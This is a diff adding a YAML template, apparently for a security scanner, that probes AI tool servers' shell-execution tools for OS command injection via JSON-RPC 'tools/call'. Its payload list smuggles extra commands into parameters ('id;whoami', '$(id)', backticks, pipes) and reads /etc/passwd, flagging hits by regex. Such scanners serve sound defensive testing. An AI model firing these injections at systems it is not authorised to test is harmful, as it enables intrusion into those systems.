@@ -1,0 +1,34 @@
+version: "1"
+name: "tool-command-injection"
+severity: critical
+description: >
+  Inject OS commands into the command parameter of shell-execution tools.
+  Uses ${matched_param} to adapt to any parameter name (command, cmd,
+  input, query, expr, script, etc.). Requires --allow-mutating.
+
+requires:
+  tools:
+    - "execute|exec|run|shell|bash|cmd|command|spawn|terminal|system"
+  inject_into: "command|cmd|input|query|expr|script|args|arg|instruction"
+
+steps:
+  - id: probe_injection
+    type: mutate
+    method: tools/call
+    params:
+      name: "${matched_tool}"
+      arguments:
+        "${matched_param}": "${payload}"
+    payloads:
+      - "id"
+      - "whoami"
+      - "id;whoami"
+      - "$(id)"
+      - "`id`"
+      - "| id"
+      - "id && echo PWNED"
+      - "cat /etc/passwd"
+    matchers:
+      - type: jsonrpc_success
+      - type: regex
+        pattern: "(uid=|gid=|root|PWNED|root:x:0:0)"
